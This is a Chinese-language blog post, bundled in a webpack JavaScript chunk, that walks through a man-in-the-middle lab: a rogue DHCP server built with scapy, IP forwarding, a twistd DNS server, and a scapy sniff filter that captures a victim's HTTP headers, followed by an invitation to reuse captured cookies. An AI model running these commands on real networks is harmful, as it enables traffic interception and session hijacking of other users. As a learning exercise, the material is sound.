webpackJsonp([81,192],{541:function(n,p){n.exports={rawContent:'\n\n## 实验准备\n\n- scapy：用来伪造dhcp/dns服务器，抓包(调用tcpdump)\n- tcpdump/wireshark：来观察网络流量。\n- twisted来建立dns服务器\n- 某个测试机器和某路由无线网络\n\n## 一点DHCP协议基础\n\nDHCP是，是干啥的呢？简单来说是为了自动化为网络中的主机配置各种配置，包括ip地址，网关，域名服务器等等。\n\n有篇不错的[中文教程](http://jeffyyko.blog.51cto.com/28563/163168)带你回顾整个dhcp服务过程，然而，事情不总是这样的。比如linux和安卓一般默认就没有arping检查重复ip的过程。\n\n## Rogue DHCP Server\n\n流氓服务器，指非法在网络中提供dhcp服务的机器。由于dhcp服务没有认证过程，任何dhcp服务器都能为网络上的机器提供服务。实际上就是几个服务器竞争看谁反应快客户端就使用谁，这为中间人攻击提供了可能。\n\n## 一次中间人攻击\n\n我们试着搭建一个流氓dhcp服务器来指向错误的网关和dns(即我们自己)。\n\n本机的ip地址是`192.168.1.101`，这是无线路由中dhcp服务器分配的。为了让实验一定成功，最好干脆把无线路由的dhcp功能关掉，自己手动配置地址`192.168.1.101`，然后搭建个dhcp服务器。\n\n首先，确认设置ip转发功能：\n\n    gentoo ~ # echo 1 > /proc/sys/net/ipv4/ip_forward\n\n首先，用scapy搭建一个dhcp服务器，把网关指向自己。scapy中`DHCP_am`的设计就是把`nameserver`也指向网关，可参考源代码。\n\n    >>> dhcp_server= DHCP_am()\n    >>> dhcp_server.gw=\'192.168.1.101\'\n    >>> dhcp_server()\n\n监听观察，发现默认网关的dhcp服务器竟然给了一个`dhcpnak`：\n\n     ~ ⮀ sudo tcpdump -i wlan0 port 67 or port 68 \n    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode\n    listening on wlan0, link-type EN10MB (Ethernet), capture size 65535 bytes\n    23:18:55.634526 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 22:22:22:22:22:22 (oui Unknown), length 302\n    23:18:55.681009 IP 192.168.1.101.bootps > 192.168.1.128.bootpc: BOOTP/DHCP, Reply, length 296\n    23:18:55.688288 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 22:22:22:22:22:22 (oui Unknown), length 314\n    23:18:55.781062 IP 192.168.1.101.bootps > 192.168.1.128.bootpc: BOOTP/DHCP, Reply, length 296\n    23:18:56.124282 IP 192.168.1.1.bootps > 255.255.255.255.bootpc: BOOTP/DHCP, Reply, length 548\n\n用twisted建立一个DNS服务器[^1]：\n\n    sudo twistd -n dns --recursive --cache\n\n在scapy中开始中间人攻击(窃听)，比如窃听http头：\n\n    pkts = sniff(filter="(tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)) and host 192.168.1.128 and (not host 192.168.1.1)",iface="wlan0", prn=lambda x: x.sprintf("{IP:%IP.src% -> %IP.dst%\\n}{Raw:%Raw.load%\\n}"))\n    192.168.1.128 -> 123.125.70.102\n    \'GET /tongji/anchor?type=webapp_pv&t=1394205309005&page=carousel HTTP/1.1\\r\\nHost: wk.baidu.com\\r\\nAccept-Encod此处略去具体信息\'\n\n搞到cookie后尽情发挥吧，可以用temper data这种东西在火狐里试下。当然，cookie可以在各种地方比如requests啊selenium里啊使用。\n\n完工。其实后来实验时无线路由dhcp服务器被选中了，然后我的rogue dhcp server就一直处于无用状态。\n\nFIXME：可以尝试一个dhcprelease来试着解除租约，可能涉及xid或transaction ID这些东西的监听和伪造。也许会在查阅更多资料后尝试，也许。\n\nUpdate：以下这个链接做了这些，不过，它怎么获得xid(transaction id)的不是很明白，要赶在dhcp client的dhcprequest发出之后dhcp server返回dhcpack之前向dhcp client注入dhcpnak，好像得在开始建立连接的时候就开始监听，获取transaction id，直接就伪装成dhcp服务器想客户端发送dhcpnak。\n\n- [http://www.backtrack-linux.org/forums/showthread.php?t=25132](http://www.backtrack-linux.org/forums/showthread.php?t=25132)\n\n\n[^1]: 最开始我用scapy来建立dns服务器： `dns_spoof()`.关于用scapy做DNS转发服务器，参见PacketGeek上scapy的教程[Scapy and DNS](http://thepacketgeek.com/scapy-p-09-scapy-and-dns/)\n',metaData:{layout:"post",title:"Playing and Learning DHCP in Action",excerpt:"动手学习计算机网络系列(二)",category:"network",tags:["network"],disqus:!0}}}});